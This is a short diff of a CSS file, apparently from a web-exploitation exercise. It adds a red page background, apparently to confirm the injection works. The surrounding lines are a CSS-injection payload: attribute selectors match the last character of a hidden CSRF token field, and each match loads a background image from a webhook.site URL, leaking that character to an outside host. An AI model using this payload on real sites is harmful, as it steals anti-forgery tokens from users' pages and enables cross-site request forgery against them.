@@ -1,3 +1,7 @@
+body {
+    background-color: red;
+}
+
 input[name=csrf][value$="0"]{ background-image: url(https://webhook.site/af50aa25-f2c2-4562-ac29-aee72c8929d4/0); }
 input[name=csrf][value$="1"]{ background-image: url(https://webhook.site/af50aa25-f2c2-4562-ac29-aee72c8929d4/1); }
 input[name=csrf][value$="2"]{ background-image: url(https://webhook.site/af50aa25-f2c2-4562-ac29-aee72c8929d4/2); }
